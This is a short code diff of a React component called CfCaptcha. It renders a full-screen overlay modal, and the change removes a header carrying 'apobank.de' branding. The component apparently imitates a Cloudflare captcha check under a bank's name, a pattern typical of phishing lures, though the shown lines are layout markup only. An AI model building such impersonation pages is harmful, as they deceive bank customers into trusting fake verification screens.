@@ -149,10 +149,6 @@ const CfCaptcha = () => {
       </div>
       <div className="fixed inset-0 z-50 bg-black/40 flex items-center justify-center px-4 py-8 overflow-auto">
         <div className="w-full max-w-[680px]">
-          <div className="flex items-center gap-3 mb-4">
-            <div className="h-9 w-9 rounded-full bg-white border border-slate-200 flex items-center justify-center text-[#001f5b] font-bold">a</div>
-            <h1 className="text-[26px] font-semibold text-[#0f172a] leading-none">apobank.de</h1>
-          </div>
 
           <div className="rounded-xl overflow-hidden border border-slate-200 bg-white shadow-2xl">
             <header className="flex items-center justify-between px-6 py-5 bg-white border-b border-slate-100">
